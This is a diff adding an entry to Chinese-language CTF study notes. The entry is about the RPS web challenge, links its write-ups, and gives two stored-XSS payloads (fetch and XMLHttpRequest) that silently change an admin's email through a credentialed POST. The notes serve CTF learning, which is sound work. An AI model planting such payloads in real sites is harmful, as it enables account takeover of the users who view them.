@@ -944,3 +944,25 @@ $('#ajax-load').load('/ajax/articles?cat=news');
 - [GAS](https://zhuanlan.zhihu.com/p/34960267)，[calldata](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/f958b119-5a8d-4050-ad68-6422d10a7655.xhtml)和[function selector](https://solidity-by-example.org/function-selector/)等概念
 158. [sqlite注入](https://juejin.cn/post/7016991806759911454)。sqlite的语法大部分和sql差不多，不过注释符是`--`,`;`,`/*`。
 159. JWT不仅可以被存储在Cookie里，也可以被存在浏览器的Local Storage里。
+160. [RPS](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/RPS/writeup.md)（另一版本[wp](https://sichej.it/writeups/rps-writeup/)）
+- [plain input(text) fields](https://stackoverflow.com/questions/56843356/plain-text-field-validation-for-protection-against-xss-attack)路由可能会成为xss的潜在攻击对象。或者说，当题目明确提示要成为admin+有机器人/管理员会查看xxx等提示时，就要考虑xss了。管理员要查看的xxx就是需要特别关注的地方。
+- 同样的xss更改邮箱（可以换成任何其他题目的路由）payload，既可以用fetch：
+
+```js
+<script>
+    fetch("https://rps.ctf.pragyan.org/email", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+        credentials: "include",
+        body: "newEmail=youremail%40gmail.com",
+    });
+</script>
+```
+
+也可以用XMLHttpRequest：
+
+```js
+<script> const xhr = new XMLHttpRequest(); xhr.open('POST', '{URL}/email');xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify({newEmail: "your_email_here"})); </script>
+```
